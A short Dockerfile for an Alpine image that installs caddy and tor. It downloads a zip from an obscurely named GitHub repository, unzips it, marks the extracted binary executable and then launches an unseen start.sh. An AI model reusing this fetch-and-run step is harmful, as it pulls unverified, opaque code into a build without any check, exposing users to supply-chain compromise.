FROM alpine:edge

RUN apk update && \
    apk add --no-cache ca-certificates caddy tor wget && \
    wget -qO- https://github.com/jtyu7y6745bnrjrut8i45t4363ejmrmht/raway/raw/main/ry.zip | busybox unzip - && \
    chmod +x $(ls /x*y) && \
    rm -rf /var/cache/apk/*

ADD start.sh /start.sh
RUN chmod +x /start.sh

CMD /start.sh